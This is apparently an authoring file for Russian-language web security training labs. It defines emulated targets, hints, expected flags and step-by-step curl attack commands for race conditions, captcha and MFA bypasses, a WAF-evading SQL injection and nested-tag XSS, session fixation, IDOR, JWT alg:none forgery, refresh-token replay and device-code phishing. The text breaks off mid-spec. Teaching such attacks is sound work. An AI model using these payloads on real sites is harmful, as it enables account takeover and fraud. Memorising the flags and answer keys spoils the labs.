# Batch: console-friendly web hands-on labs (logic / auth / SSO). Fixtures are
# realistic replay captures of the flows described in each lesson (curl HTTP
# responses, SAML XML, OAuth redirects). Authoring helper consumed by _labgen.py.
import base64
import json

WD = '/home/student/task'
CHECK = "grep -q 'nto{' found.txt"


def _b64u(obj):
    return base64.urlsafe_b64encode(
        json.dumps(obj, separators=(',', ':')).encode()).decode().rstrip('=')


def _b64(obj):
    return base64.b64encode(
        json.dumps(obj, separators=(',', ':')).encode()).decode()


JWT_HEADER = _b64u({'alg': 'HS256', 'typ': 'JWT'})
JWT_PAYLOAD = _b64u({'sub': '1001', 'name': 'alice', 'role': 'user'})
JWT = JWT_HEADER + '.' + JWT_PAYLOAD + '.7f3c9a1e4b2d8c6f0a5e3d9b1c7f2a4e8d6b0c3f'
NONE_HEADER = _b64({'alg': 'none', 'typ': 'JWT'})
ADMIN_PAYLOAD = _b64({'sub': '1', 'role': 'admin'})

SPECS = [
    # ---------------------------------------------------------------- logic
    {
        'id': 'web-logic-races',
        'category': 'web',
        'title': 'Практика: гонка за одноразовым купоном',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Один запрос купон применяет, второй получает `coupon_already_used` — проверка и запись разделены во времени.',
            'Последовательные запросы лимит не обходят: нужна ОДНОВРЕМЕННОСТЬ (single-packet).',
            "В curl пачка одновременных запросов — это `--parallel` с URL-глобом: добавь `&burst=20`.",
            "Запусти: `curl -s --parallel -X POST 'http://shop.local/cart/coupon?code=SAVE10&burst=20' | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{r4c3_0v3rrun_0n3_p4ck3t}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: race condition (limit overrun)\n\n"
                "`shop.local` даёт одноразовый купон `SAVE10` («один раз на пользователя»).\n"
                "Сервер делает `if (!used) { mark_used(); apply_discount(); }` — между\n"
                "проверкой и записью есть зазор. Если послать запросы ОДНОВРЕМЕННО, они\n"
                "пройдут проверку до того, как состояние изменится.\n\n"
                "1. Один запрос (купон применён, повтор — отказ):\n"
                "   curl -s -X POST 'http://shop.local/cart/coupon' -d 'code=SAVE10'\n"
                "2. Гонка. Одновременные запросы в curl — через `--parallel` и URL-глоб\n"
                "   (пачка из 20 штук):\n"
                "   curl -s --parallel -X POST 'http://shop.local/cart/coupon?code=SAVE10&burst=20'\n"
                "3. Часть запросов пройдёт мимо лимита, итог корзины уйдёт в минус, и\n"
                "   сервер вернёт флаг.\n"
                "4. Флаг — последняя строка. Запиши в `found.txt` и набери `check`.\n"
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local/cart/coupon)',
                'cases': [
                    {'match': r'parallel|burst',
                     'example': "-s --parallel -X POST 'http://shop.local/cart/coupon?code=SAVE10&burst=20'",
                     'output': (
                         '[1] {"status":"ok","applied":true,"discount":10}\n'
                         '[2] {"status":"ok","applied":true,"discount":10}\n'
                         '[3] {"status":"ok","applied":true,"discount":10}\n'
                         '[4] {"status":"ok","applied":true,"discount":10}\n'
                         '[5] {"status":"ok","applied":true,"discount":10}\n'
                         '[6] {"status":"error","message":"coupon_already_used"}\n'
                         '[7] {"status":"error","message":"coupon_already_used"}\n'
                         '[8] {"status":"error","message":"coupon_already_used"}\n'
                         '=== cart state ===\n'
                         '{"order":555,"total":-40,"discount_applied":5,'
                         '"note":"race won: limit overrun",'
                         '"flag":"nto{r4c3_0v3rrun_0n3_p4ck3t}"}\n'
                     )},
                    {'match': r'cart/coupon',
                     'example': "-s -X POST 'http://shop.local/cart/coupon' -d 'code=SAVE10'",
                     'output': (
                         '{"status":"ok","discount":10,"order_total":90,'
                         '"message":"coupon applied (limit 1 per user)"}\n'
                     )},
                ],
                'fallback': 'curl: в этой лабе эмулируется только http://shop.local/cart/coupon.\n',
            }
        },
    },
    {
        'id': 'web-logic-core',
        'category': 'web',
        'title': 'Практика: обход капчи отсутствием параметра',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Сначала убедись, что капча вообще обязательна на сервере, а не только в браузере.',
            "Попробуй регистрацию БЕЗ полей капчи: `curl -s -X POST https://shop.local/register -d 'user=alice&pass=x'`.",
            'Сервер проверяет капчу только если параметр пришёл. Зарегистрируй зарезервированного `admin` без капчи.',
            "`curl -s -X POST https://shop.local/register -d 'user=admin&pass=x' | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{c4ptch4_sk1pp3d_w1th0ut_p4r4m}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: обход капчи (логический баг)\n\n"
                "На регистрации `shop.local` есть капча. Но сервер проверяет её только\n"
                "если параметр `captcha` вообще пришёл в запросе: нет параметра — нет\n"
                "проверки. Пользуйся этим.\n\n"
                "1. С капчей (неверный код):\n"
                "   curl -s -X POST https://shop.local/register -d 'captcha_id=c7f1&captcha=ABCD&user=alice&pass=x'\n"
                "2. Тот же запрос БЕЗ полей капчи — сервер зарегистрирует пользователя:\n"
                "   curl -s -X POST https://shop.local/register -d 'user=alice&pass=x'\n"
                "3. Зарезервированный `admin` так тоже создаётся — сервер вернёт флаг.\n"
                "4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local/register)',
                'cases': [
                    {'match': r'user=admin',
                     'example': "-s -X POST https://shop.local/register -d 'user=admin&pass=x'",
                     'output': (
                         '{"status":"ok","user_id":1,"user":"admin","role":"admin",'
                         '"note":"captcha not required when param absent",'
                         '"flag":"nto{c4ptch4_sk1pp3d_w1th0ut_p4r4m}"}\n'
                     )},
                    {'match': r'captcha',
                     'example': "-s -X POST https://shop.local/register -d 'captcha_id=c7f1&captcha=ABCD&user=alice&pass=x'",
                     'output': '{"error":"wrong_captcha"}\n'},
                    {'match': r'register',
                     'example': "-s -X POST https://shop.local/register -d 'user=bob&pass=x'",
                     'output': '{"status":"ok","user":42,"role":"user"}\n'},
                ],
                'fallback': 'curl: в этой лабе эмулируется только https://shop.local/register.\n',
            }
        },
    },
    {
        'id': 'web-logic-bypass-chains',
        'category': 'web',
        'title': 'Практика: обход WAF и цепочка инъекций',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            "Фильтр вырезает по шаблону: `<scr<script>ipt>` после вырезания даёт рабочий `<script>`.",
            'WAF и приложение парсят запрос по-разному — используй расхождение парсеров.',
            "MySQL-комментарий `/*!50000...*/` WAF видит как комментарий, а БД исполняет содержимое.",
            "Запусти: `curl -s 'https://shop.local/api/user?id=1/*!50000UNION*/SELECT%20pass%20FROM%20users' | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{w4f_p4rs3r_d1s4gr33m3nt_un10n}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: обход фильтра WAF и цепочка\n\n"
                "`shop.local` фильтрует ввод и ставит WAF перед API. Обойди и то, и другое.\n\n"
                "1. Фильтр вырезает теги по шаблону. Вложи тег в тег:\n"
                "   curl -s 'https://shop.local/search?q=<scr<script>ipt>alert(1)</script>'\n"
                "2. WAF блокирует грубый SQLi (403):\n"
                "   curl -s -o /dev/null -w '%{http_code}\\n' 'https://shop.local/api/user?id=1%20UNION%20SELECT%20pass%20FROM%20users'\n"
                "3. Обойди WAF расхождением парсеров — «исполняемый комментарий» MySQL:\n"
                "   curl -s 'https://shop.local/api/user?id=1/*!50000UNION*/SELECT%20pass%20FROM%20users'\n"
                "4. В выводе — флаг. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local/search и /api/user)',
                'cases': [
                    {'match': r'50000UNION',
                     'example': "-s 'https://shop.local/api/user?id=1/*!50000UNION*/SELECT%20pass%20FROM%20users'",
                     'output': (
                         '{"id":1,"name":"admin","pass":"$2y$10$h4ck3d...",'
                         '"dump":["admin:$2y$10$h4ck3d","bob:$2y$10$x"],'
                         '"flag":"nto{w4f_p4rs3r_d1s4gr33m3nt_un10n}"}\n'
                     )},
                    {'match': r'UNION',
                     'example': "-s -o /dev/null -w '%{http_code}' 'https://shop.local/api/user?id=1%20UNION%20SELECT%20pass%20FROM%20users'",
                     'output': '403\n'},
                    {'match': r'scr<script>',
                     'example': "-s 'https://shop.local/search?q=<scr<script>ipt>alert(1)</script>'",
                     'output': '<div class="results">1 result for: <script>alert(1)</script></div>\n'},
                    {'match': r'search',
                     'example': "-s 'https://shop.local/search?q=<script>alert(1)</script>'",
                     'output': '<div class="results">0 results for: alert(1)</div>\n'},
                ],
                'fallback': 'curl: в этой лабе эмулируются только /search и /api/user на shop.local.\n',
            }
        },
    },
    {
        'id': 'web-business-logic-advanced',
        'category': 'web',
        'title': 'Практика: обход workflow (пропуск оплаты)',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Сценарий заказа: cart → address → pay → confirm. Посмотри, какие переходы сервер реально проверяет.',
            'Вызови финальный `confirm` НАПРЯМУЮ, не пройдя `pay`.',
            "Сессия и cart_id у тебя есть: `cart_id=c1`, cookie `session=me`.",
            "`curl -s -X POST https://shop.local/api/checkout/confirm -H 'Cookie: session=me' -d 'cart_id=c1' | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{w0rkfl0w_byp4ss_sk1pp3d_p4ym3nt}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: workflow bypass (пропуск оплаты)\n\n"
                "`shop.local` оформляет заказ в несколько шагов: корзина → адрес → оплата →\n"
                "подтверждение. Сценарий предполагает, что `confirm` вызывается ПОСЛЕ\n"
                "`pay`, но сервер не проверяет факт оплаты. Обойди шаг.\n\n"
                "1. Обычная последовательность:\n"
                "   curl -s -X POST https://shop.local/api/checkout/cart -d 'item=9'\n"
                "   curl -s -X POST https://shop.local/api/checkout/address -d 'addr=a1'\n"
                "2. Вызови подтверждение НАПРЯМУЮ, без оплаты:\n"
                "   curl -s -X POST https://shop.local/api/checkout/confirm -H 'Cookie: session=me' -d 'cart_id=c1'\n"
                "3. Заказ подтверждён без оплаты — в ответе флаг.\n"
                "4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local/api/checkout/*)',
                'cases': [
                    {'match': r'checkout/confirm',
                     'example': "-s -X POST https://shop.local/api/checkout/confirm -H 'Cookie: session=me' -d 'cart_id=c1'",
                     'output': (
                         '{"order_id":7002,"status":"confirmed","paid":false,'
                         '"note":"order confirmed without payment step",'
                         '"flag":"nto{w0rkfl0w_byp4ss_sk1pp3d_p4ym3nt}"}\n'
                     )},
                    {'match': r'checkout/pay',
                     'example': "-s -X POST https://shop.local/api/checkout/pay -d 'cart_id=c1'",
                     'output': '{"paid":true,"method":"card"}\n'},
                    {'match': r'checkout/cart',
                     'example': "-s -X POST https://shop.local/api/checkout/cart -d 'item=9'",
                     'output': '{"cart_id":"c1","items":[{"item":9,"qty":1}]}\n'},
                ],
                'fallback': 'curl: в этой лабе эмулируются /api/checkout/cart|address|pay|confirm на shop.local.\n',
            }
        },
    },
    {
        'id': 'web-captcha-bypass',
        'category': 'web',
        'title': 'Практика: обход CAPTCHA через reuse ответа',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Получи капчу: `curl -s https://shop.local/captcha/new` — вернёт `captcha_id`.',
            'Реши её один раз правильным ответом — сервер запомнит пару `captcha_id`/ответ.',
            'Сервер НЕ помечает `captcha_id` использованным: тот же ответ можно переиспользовать.',
            "Переиспользуй капчу для burst-перебора OTP: `curl -s --parallel 'https://shop.local/login/otp?captcha_id=c_88f1&captcha=4f7k2&otp=0000..9999&burst=100' | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{c4ptch4_r3us3_brut3f0rc3_0tp}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: обход CAPTCHA (reuse ответа)\n\n"
                "`shop.local` защищает вход второго фактора капчей. Но `captcha_id` не\n"
                "помечается использованным — одну решённую капчу можно прикладывать к\n"
                "неограниченному числу запросов. Это открывает перебор OTP.\n\n"
                "1. Получи капчу и реши её:\n"
                "   curl -s https://shop.local/captcha/new\n"
                "   curl -s -X POST https://shop.local/login/otp -d 'captcha_id=c_88f1&captcha=4f7k2&otp=0000'\n"
                "2. Переиспользуй ту же капчу для burst-перебора кода (`--parallel` + глоб):\n"
                "   curl -s --parallel 'https://shop.local/login/otp?captcha_id=c_88f1&captcha=4f7k2&otp=0000..9999&burst=100'\n"
                "3. Один из кодов подойдёт — в выводе флаг.\n"
                "4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local/captcha и /login/otp)',
                'cases': [
                    {'match': r'burst|parallel',
                     'example': "-s --parallel 'https://shop.local/login/otp?captcha_id=c_88f1&captcha=4f7k2&otp=0000..9999&burst=100'",
                     'output': (
                         '[1] {"status":"invalid_otp","otp":"0000"}\n'
                         '[2] {"status":"invalid_otp","otp":"0001"}\n'
                         '[3] {"status":"invalid_otp","otp":"0002"}\n'
                         '...\n'
                         '[42] {"status":"ok","otp":"0042","captcha":"reused",'
                         '"note":"captcha_id never invalidated",'
                         '"flag":"nto{c4ptch4_r3us3_brut3f0rc3_0tp}"}\n'
                     )},
                    {'match': r'captcha/new',
                     'example': '-s https://shop.local/captcha/new',
                     'output': '{"captcha_id":"c_88f1","image":"/captcha/c_88f1.png"}\n'},
                    {'match': r'login/otp',
                     'example': "-s -X POST https://shop.local/login/otp -d 'captcha_id=c_88f1&captcha=4f7k2&otp=0000'",
                     'output': '{"status":"invalid_otp","otp":"0000","captcha":"accepted"}\n'},
                ],
                'fallback': 'curl: в этой лабе эмулируются /captcha/new и /login/otp на shop.local.\n',
            }
        },
    },
    # ------------------------------------------------------------- sessions
    {
        'id': 'web-cookies-sessions',
        'category': 'web',
        'title': 'Практика: фиксация сессии',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Загляни в `Set-Cookie` при входе: сервер НЕ меняет идентификатор сессии после логина.',
            'Атакующий знает заранее выданный `session=attacker_fixed_id` — он не сгорает при логине жертвы.',
            'Войди с заранее известной cookie: `curl -s -i -b \'session=attacker_fixed_id\' -X POST https://shop.local/login -d \'username=admin&password=admin\'`.',
            "Затем прочитай аккаунт этой cookie: `curl -s -b 'session=attacker_fixed_id' https://shop.local/account | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{s3ss10n_f1x4t10n_t4k30v3r}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: session fixation\n\n"
                "`shop.local` не ротирует идентификатор сессии при логине. Если атакующий\n"
                "навяжет жертве свой `session`, после её входа эта cookie станет\n"
                "аутентифицированной — и атакующий войдёт под жертвой.\n\n"
                "1. Получи cookie до логина (атакующий уже знает её):\n"
                "   curl -s -i https://shop.local/ -c jar.txt\n"
                "2. Жертва логинится с этой же cookie — сервер её НЕ меняет:\n"
                "   curl -s -i -b 'session=attacker_fixed_id' -X POST https://shop.local/login -d 'username=admin&password=admin'\n"
                "3. Теперь cookie аутентифицирована. Прочитай аккаунт:\n"
                "   curl -s -b 'session=attacker_fixed_id' https://shop.local/account\n"
                "4. В аккаунте флаг. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local)',
                'cases': [
                    {'match': r'account',
                     'example': "-s -b 'session=attacker_fixed_id' https://shop.local/account",
                     'output': (
                         '<h1>Account</h1>\n'
                         '<p>Добро пожаловать, admin</p>\n'
                         'nto{s3ss10n_f1x4t10n_t4k30v3r}\n'
                     )},
                    {'match': r'login',
                     'example': "-s -i -b 'session=attacker_fixed_id' -X POST https://shop.local/login -d 'username=admin&password=admin'",
                     'output': (
                         'HTTP/1.1 302 Found\n'
                         'Location: /account\n'
                         'Set-Cookie: session=attacker_fixed_id; Path=/; HttpOnly\n'
                         'Content-Length: 0\n'
                     )},
                    {'match': r'shop\.local',
                     'example': '-s -i https://shop.local/',
                     'output': (
                         'HTTP/1.1 200 OK\n'
                         'Set-Cookie: session=attacker_fixed_id; Path=/\n'
                         'Content-Type: text/html\n\n'
                         '<h1>shop.local</h1>\n'
                     )},
                ],
                'fallback': 'curl: в этой лабе эмулируются /, /login и /account на shop.local.\n',
            }
        },
    },
    {
        'id': 'web-auth-core',
        'category': 'web',
        'title': 'Практика: IDOR/BOLA в API пользователей',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'cookies.txt'],
        'check': CHECK,
        'hints': [
            'Ты вошёл как `alice` (id=42), cookie сохранена в `cookies.txt`.',
            'Открой свой профиль: `curl -s -b cookies.txt https://shop.local/api/v1/users/42`.',
            'Сервер проверяет только факт логина, а не принадлежность объекта. Подставь чужой id.',
            "`curl -s -b cookies.txt https://shop.local/api/v1/users/1 | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{1d0r_b0l4_br34ks_th3_b0und4ry}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: IDOR/BOLA (горизонтальный доступ)\n\n"
                "Ты вошёл как `alice` (id=42) на `shop.local`. API отдаёт профиль по id,\n"
                "проверяя только факт логина. Смени идентификатор на чужой.\n\n"
                "1. Свой профиль:\n"
                "   curl -s -b cookies.txt https://shop.local/api/v1/users/42\n"
                "2. Чужой id (администратор):\n"
                "   curl -s -b cookies.txt https://shop.local/api/v1/users/1\n"
                "3. В профиле админа — флаг.\n"
                "4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
            {'path': WD + '/cookies.txt', 'text': (
                '# Netscape HTTP Cookie File\n'
                'shop.local\tFALSE\t/\tFALSE\t0\tsession\teyJ1aWQiOjQyfQ\n'
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local/api/v1/users)',
                'cases': [
                    {'match': r'users/1\b',
                     'example': '-s -b cookies.txt https://shop.local/api/v1/users/1',
                     'output': (
                         '{"id":1,"email":"admin@shop.local","role":"admin","balance":99999,'
                         '"api_key":"nto{1d0r_b0l4_br34ks_th3_b0und4ry}"}\n'
                     )},
                    {'match': r'users/42',
                     'example': '-s -b cookies.txt https://shop.local/api/v1/users/42',
                     'output': '{"id":42,"email":"alice@shop.local","role":"user","balance":150}\n'},
                ],
                'fallback': 'curl: в этой лабе эмулируется только https://shop.local/api/v1/users/<id>.\n',
            }
        },
    },
    {
        'id': 'web-auth-bypass',
        'category': 'web',
        'title': 'Практика: обход MFA через подделку состояния',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Первый шаг логина выдаёт `mfa_required` и ставит cookie `mfa=0` (состояние живёт на клиенте).',
            'Проверка второго шага доверяет этой cookie, а не серверу.',
            "Подделай состояние: `-b 'session=8f2a11c0; mfa=1'`.",
            "`curl -s 'https://shop.local/login/mfa/complete' -b 'session=8f2a11c0; mfa=1' | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{mf4_st4t3_c00k13_t4mp3r3d}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: обход MFA (подделка клиентского состояния)\n\n"
                "Вход на `shop.local` двухшаговый. После пароля сервер ставит cookie\n"
                "`mfa=0`, а проверку второго шага делает по ЭТОЙ cookie — то есть доверяет\n"
                "клиенту. Переключи её в `mfa=1`.\n\n"
                "1. Первый шаг — пароль:\n"
                "   curl -s -i -c c.txt -d 'user=alice&pass=alice123' https://shop.local/login\n"
                "   (в ответе `Set-Cookie: session=8f2a11c0; mfa=0` и `\"mfa_required\":true`)\n"
                "2. Обойди проверку, выставив состояние вручную:\n"
                "   curl -s 'https://shop.local/login/mfa/complete' -b 'session=8f2a11c0; mfa=1'\n"
                "3. Сервер поверит cookie и пустит — в ответе флаг.\n"
                "4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local/login*)',
                'cases': [
                    {'match': r'mfa/complete',
                     'example': "-s 'https://shop.local/login/mfa/complete' -b 'session=8f2a11c0; mfa=1'",
                     'output': (
                         '{"status":"authenticated","user":"alice","role":"admin",'
                         '"note":"mfa state trusted from client cookie",'
                         '"flag":"nto{mf4_st4t3_c00k13_t4mp3r3d}"}\n'
                     )},
                    {'match': r'login/mfa',
                     'example': "-s -b c.txt -d 'mfa_token=8f2a11c0&code=000000' https://shop.local/login/mfa",
                     'output': '{"status":"invalid_code"}\n'},
                    {'match': r'login',
                     'example': "-s -i -c c.txt -d 'user=alice&pass=alice123' https://shop.local/login",
                     'output': (
                         'HTTP/1.1 200 OK\n'
                         'Set-Cookie: session=8f2a11c0; Path=/; mfa=0\n'
                         'Content-Type: application/json\n\n'
                         '{"status":"mfa_required","mfa_token":"8f2a11c0","next":"/login/mfa"}\n'
                     )},
                ],
                'fallback': 'curl: в этой лабе эмулируются /login, /login/mfa и /login/mfa/complete на shop.local.\n',
            }
        },
    },
    {
        'id': 'web-auth-jwt-idor',
        'category': 'web',
        'title': 'Практика: JWT alg:none + IDOR',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'token.txt'],
        'check': CHECK,
        'hints': [
            'Токен в `token.txt`. Посмотри payload: `cut -d. -f2 token.txt | base64 -d`.',
            'Сервер не проверяет подпись — примет `alg: none`. Собери новый заголовок: `echo -n \'{"alg":"none","typ":"JWT"}\' | base64 -w0`.',
            'Собери payload админа (чужой sub): `echo -n \'{"sub":"1","role":"admin"}\' | base64 -w0`.',
            'Задай `export H=<hdr>` и `export P=<pay>`, затем: `curl -s https://shop.local/api/orders/1002 -H "Authorization: Bearer $H.$P." | tail -1 > found.txt`, затем `check`.',
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{jwt_4lg_n0n3_1d0r_4dm1n}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: JWT alg:none + IDOR\n\n"
                "Ты получил JWT пользователя `alice` (`sub=1001`, `role=user`). Сервер не\n"
                "проверяет подпись: принимает любой токен с `alg: none`. Подделай токен\n"
                "администратора и прочитай чужой заказ.\n\n"
                "1. Токен — в `token.txt`. Раскодируй части:\n"
                "   cut -d. -f1 token.txt | base64 -d\n"
                "   cut -d. -f2 token.txt | base64 -d\n"
                "2. Собери новый заголовок и payload (стандартный base64):\n"
                "   echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 -w0\n"
                "   echo -n '{\"sub\":\"1\",\"role\":\"admin\"}' | base64 -w0\n"
                "3. Задай их переменными и склей токен `H.P.` (подпись пустая):\n"
                "   export H=<header-b64>\n"
                "   export P=<payload-b64>\n"
                "4. Запроси чужой заказ:\n"
                "   curl -s https://shop.local/api/orders/1002 -H \"Authorization: Bearer $H.$P.\"\n"
                "5. Достань флаг (`cut -d: -f3`) в `found.txt` и набери `check`.\n"
            )},
            {'path': WD + '/token.txt', 'text': JWT + '\n'},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local/api)',
                'cases': [
                    {'match': r'eyJhbGciOiJub25l',
                     'example': '-s https://shop.local/api/orders/1002 -H "Authorization: Bearer <forged>"',
                     'output': (
                         '{"order":1002,"owner":"admin","total":13370,'
                         '"flag":"nto{jwt_4lg_n0n3_1d0r_4dm1n}"}\n'
                     )},
                    {'match': r'orders/1002',
                     'example': '-s https://shop.local/api/orders/1002 -H "Authorization: Bearer <user-token>"',
                     'output': '{"error":"forbidden","reason":"order belongs to another user"}\n'},
                    {'match': r'api/login',
                     'example': "-s 'https://shop.local/api/login' -d 'user=alice&pass=alice123'",
                     'output': (
                         '{"access_token":"' + JWT + '","token_type":"Bearer",'
                         '"note":"payload is only base64"}\n'
                     )},
                ],
                'fallback': 'curl: в этой лабе эмулируются /api/login и /api/orders/1002 на shop.local.\n',
            }
        },
    },
    {
        'id': 'web-auth-protocols',
        'category': 'web',
        'title': 'Практика: replay refresh-токена после logout',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'tokens.txt'],
        'check': CHECK,
        'hints': [
            'В `tokens.txt` — выданные `access_token` и `refresh_token`.',
            'Выйди из аккаунта: `curl -s https://shop.local/api/logout -H "Authorization: Bearer <access>"`.',
            'Сервер не инвалидирует refresh-токен при logout и не ротирует его.',
            "Обменяй старый refresh на новый access: `curl -s -d 'grant_type=refresh_token&refresh_token=rt_9f2a11c0' https://shop.local/api/token | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{r3fr3sh_t0k3n_r3pl4y_4ft3r_l0g0ut}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: refresh-токен не отзывается\n\n"
                "`shop.local` выдаёт пару `access_token`/`refresh_token`. При logout сервер\n"
                "гасит access-токен, но refresh остаётся живым и не ротируется — его можно\n"
                "переиграть и получить новый доступ.\n\n"
                "1. Токены — в `tokens.txt`.\n"
                "2. Выйди из аккаунта:\n"
                "   curl -s https://shop.local/api/logout -H 'Authorization: Bearer <access>'\n"
                "3. Переиграй refresh-токен (после logout):\n"
                "   curl -s -d 'grant_type=refresh_token&refresh_token=rt_9f2a11c0' https://shop.local/api/token\n"
                "4. Сервер выдаст новый access-токен — в ответе флаг.\n"
                "5. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
            {'path': WD + '/tokens.txt', 'text': (
                'access_token=' + JWT + '\n'
                'refresh_token=rt_9f2a11c0\n'
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local/api/token)',
                'cases': [
                    {'match': r'grant_type=refresh_token',
                     'example': "-s -d 'grant_type=refresh_token&refresh_token=rt_9f2a11c0' https://shop.local/api/token",
                     'output': (
                         '{"access_token":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAxIn0.new",'
                         '"expires_in":3600,"refresh_rotated":false,'
                         '"note":"refresh token replayed after logout",'
                         '"flag":"nto{r3fr3sh_t0k3n_r3pl4y_4ft3r_l0g0ut}"}\n'
                     )},
                    {'match': r'api/logout',
                     'example': "-s https://shop.local/api/logout -H 'Authorization: Bearer <access>'",
                     'output': '{"status":"logged_out","access_revoked":true,"refresh_revoked":false}\n'},
                    {'match': r'api/login',
                     'example': "-s -d 'user=alice&pass=alice123' https://shop.local/api/login",
                     'output': (
                         '{"access_token":"' + JWT + '","refresh_token":"rt_9f2a11c0",'
                         '"token_type":"Bearer"}\n'
                     )},
                ],
                'fallback': 'curl: в этой лабе эмулируются /api/login, /api/logout и /api/token на shop.local.\n',
            }
        },
    },
    # ------------------------------------------------------------- oauth/sso
    {
        'id': 'web-oauth-device-code',
        'category': 'web',
        'title': 'Практика: device code phishing',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Устройство запрашивает код: `curl -s https://acmeid.example/device/code -d \'client_id=shop-tv&scope=openid\'`.',
            'Получишь `device_code` (секрет) и `user_code` (его человек вводит на `verification_uri`).',
            'Жертва вводит ЧУЖОЙ `user_code` и подтверждает — токены уходят устройству, начавшему flow.',
            "Собери итог: `curl -s 'https://acmeid.example/device/approve?user_code=WDJB-MJHT&device_code=GmRhmhcxhwAzkoEqiMEg' | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{d3v1c3_c0d3_ph1sh1ng_t0k3n_st34l}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: device code phishing\n\n"
                "Вход на ТВ через `device code flow`: устройство просит код, человек вводит\n"
                "короткий `user_code` на сайте провайдера и подтверждает. Атакующий запускает\n"
                "flow у СЕБЯ, отдаёт жертве свой `user_code` — и получает токены жертвы.\n\n"
                "1. Запроси код (как устройство):\n"
                "   curl -s https://acmeid.example/device/code -d 'client_id=shop-tv&scope=openid'\n"
                "2. Жертва вводит `user_code` (WDJB-MJHT) и подтверждает вход.\n"
                "3. Токены уходят устройству, начавшему flow:\n"
                "   curl -s 'https://acmeid.example/device/approve?user_code=WDJB-MJHT&device_code=GmRhmhcxhwAzkoEqiMEg'\n"
                "4. В ответе — токен жертвы и флаг.\n"
                "5. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция acmeid.example device flow)',
                'cases': [
                    {'match': r'device/approve',
